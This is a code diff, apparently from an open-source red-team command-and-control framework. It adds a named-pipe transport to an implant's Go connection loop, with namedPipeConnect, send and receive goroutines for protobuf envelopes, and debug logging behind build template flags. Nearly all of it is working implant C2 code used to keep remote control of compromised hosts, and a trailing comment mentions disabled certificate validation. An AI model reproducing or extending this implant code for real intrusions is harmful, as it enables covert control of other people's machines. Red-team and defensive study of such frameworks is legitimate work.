@@ -164,7 +164,19 @@ func StartConnectionLoop() *Connection {
 			// {{end}}
 			connectionAttempts++
 			// {{end}} - DNSc2Enabled
-
+		case "namedpipe":
+			// *** Named Pipe ***
+			// {{if .NamePipec2Enabled}}
+			connection, err = namedPipeConnect(uri)
+			if err == nil {
+				activeC2 = uri.String()
+				return connection
+			}
+			// {{if .Debug}}
+			log.Printf("[namedpipe] Connection failed %s", err)
+			// {{end}}
+			connectionAttempts++
+			// {{end}} -NamePipec2Enabled
 		default:
 			// {{if .Debug}}
 			log.Printf("Unknown c2 protocol %s", uri.Scheme)
@@ -420,6 +432,62 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 }
 
 // {{end}} - .DNSc2Enabled
+
+// {{if .NamePipec2Enabled}}
+func namedPipeConnect(uri *url.URL) (*Connection, error) {
+	conn, err := namePipeDial(uri)
+	if err != nil {
+		return nil, err
+	}
+	send := make(chan *pb.Envelope)
+	recv := make(chan *pb.Envelope)
+	ctrl := make(chan bool, 1)
+	connection := &Connection{
+		Send:    send,
+		Recv:    recv,
+		ctrl:    ctrl,
+		tunnels: &map[uint64]*Tunnel{},
+		mutex:   &sync.RWMutex{},
+		once:    &sync.Once{},
+		cleanup: func() {
+			// {{if .Debug}}
+			log.Printf("[namedpipe] lost connection, cleanup...")
+			// {{end}}
+			close(send)
+			ctrl <- true
+			close(recv)
+		},
+	}
+
+	go func() {
+		defer connection.Cleanup()
+		for envelope := range send {
+			// {{if .Debug}}
+			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
+			// {{end}}
+			namedPipeWriteEnvelope(conn, envelope)
+		}
+	}()
+
+	go func() {
+		defer connection.Cleanup()
+		for {
+			envelope, err := namedPipeReadEnvelope(conn)
+			if err == io.EOF {
+				break
+			}
+			if err == nil {
+				recv <- envelope
+				// {{if .Debug}}
+				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
+				// {{end}}
+			}
+		}
+	}()
+	return connection, nil
+}
+
+// {{end}} -NamePipec2Enabled
 
 // rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
 // we have to disable all of the fucking certificate validation and re-implement everything.
